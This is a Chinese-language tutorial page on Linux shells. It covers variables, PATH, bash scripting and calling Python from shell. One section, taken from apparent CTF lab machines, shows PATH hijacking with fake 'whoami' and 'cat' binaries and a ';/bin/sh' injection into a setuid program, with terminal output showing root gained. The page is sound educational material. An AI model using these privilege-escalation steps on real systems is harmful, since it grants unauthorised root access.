---
title: "Linux Shells"
date: 2025-05
categories:
  - 技术
  - 教程
tags: [Markdown, linux]
description: Linux Shells
draft: false
sidebar: false
outline: deep
---

# Linux Shells

## Intro

**一些命令**
```bash
# To see which shell you are using
echo $SHELL

# list down the available shells in Linux OS
cat /etc/shells

# make this shell as the default shell for your terminal
chsh -s /usr/bin/zsh

# display all your previous commands
history 
```
**变量**
```bash
# 定义变量
color=蓝色

# 转换为环境变量
export color=蓝色

# 持久化
echo 'export color=蓝色' >> ~/.zshrc
source ~/.zshrc
```
**环境变量**

- 环境变量由系统默认设置，用于存储会话和工作环境的信息。
- 环境变量通常都用全大写字母表示，如PATH、PWD、SHELL等。

**环境变量`PATH`**
- 指定了Shell中可执行文件所在的路径
- 路径之间存在优先级

```bash
export PATH=$PATH:/admin/bin
```

<span style="font-size: 23px;">**命令劫持**</span>

**伪造`whoami`命令**

```bash
www-data@inclusiveness:/home/tom$ echo 'echo tom' > /tmp/whoami
www-data@inclusiveness:/home/tom$ chmod a+x /tmp/whoami
www-data@inclusiveness:/home/tom$ /tmp/whoami
tom

www-data@inclusiveness:/home/tom$ export PATH=/tmp:$PATH
www-data@inclusiveness:/home/tom$ whoami
tom
```

**伪造 `/bin/bash`**

```bash
kane@pwnlab:~$ echo "/bin/bash" > /tmp/cat
kane@pwnlab:~$ chmod a+x /tmp/cat
kane@pwnlab:~$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH

kane@pwnlab:~$ strings msgmike | grep -i cat
cat /home/mike/msg.txt
kane@pwnlab:~$ ./msgmike
./msgmike
mike@pwnlab:~$ id
uid=1002(mike) gid=1002(mike) groups=1002(mike),1003(kane)

mike@pwnlab:/home/mike$ strings msg2root | grep echo
/bin/echo %s >> /root/messages.txt

mike@pwnlab:/home/mike$ ./msg2root
Message for root: hello;/bin/sh
hello
# id
uid=1002(mike) gid=1002(mike) euid=0(root) egid=0(root) groups=0(root),1003(kane)
```


## Shell Scripting 

The file must be named with an extension **.sh**.

Every script should start from shebang---**#!/bin/bash**

To give these permissions to the script, we can type the following command in our terminal:

```bash
chmod +x your_script.sh
```

`guess_number.sh`
```sh
# Defining the Interpreter 
#!/bin/bash

echo "辛美尔的颜色是 $color"

#命令替换语法$()
number=$(shuf -i 1-10 -n 1)
echo $number

while [[ $guess -ne $number ]]
do
echo "请输入一个 1-10之间的随机整数"
read guess
#条件判断 if语句
if [[ $guess -eq $number ]]; then
    echo "猜对了"
elif [[ $guess -lt $number ]]; then
    echo "小了"
else
    echo "大了"
fi   
done 
```

---

## shell with python

Shell 脚本是胶水，负责连接现有的工具；Python 脚本是手术刀，负责编写自定义的武器。

Shell 脚本做系统操作，Python 做复杂逻辑，两者互相调用、传参、拿结果。

### shell输出结果

`demo.sh`
```bash
#!/bin/bash

echo "请输入a"
read a
echo "请输入b"
read b

echo "=== Shell with Python ==="

# 传给python 并接收
res=$(./calc.py $a $b)
echo "通过python 计算的结果是: $res"
```

`calc.py`
```python
#!/usr/bin/python

import sys

# sys.argv[0] 是脚本名
a = sys.argv[1]
b = sys.argv[2]

print(int(a) + int(b))
```

### python输出结果

Shell查磁盘 Python发通知

`monitor.sh`
```bash
#!/bin/bash

# Shell 做系统命令
disk_usage=$(df -h / | grep / | awk '{print $5}')

# 传给 Python 做判断、发消息
python notify.py $disk_usage
```

`notify.py`
```python
import sys

usage = sys.argv[1].replace('%', '')

if int(usage) > 80:
    print(f"警告！磁盘使用率过高：{usage}%")
else:
    print(f"磁盘正常：{usage}%")
```

### Python 调用 Shell 命令

Python 也能反过来执行 Shell：

```python
import os
import subprocess

# 方法1
os.system("ls -l")

# 方法2（推荐，能拿输出）
result = subprocess.check_output("echo hello", shell=True, text=True)
print(result)
```
---


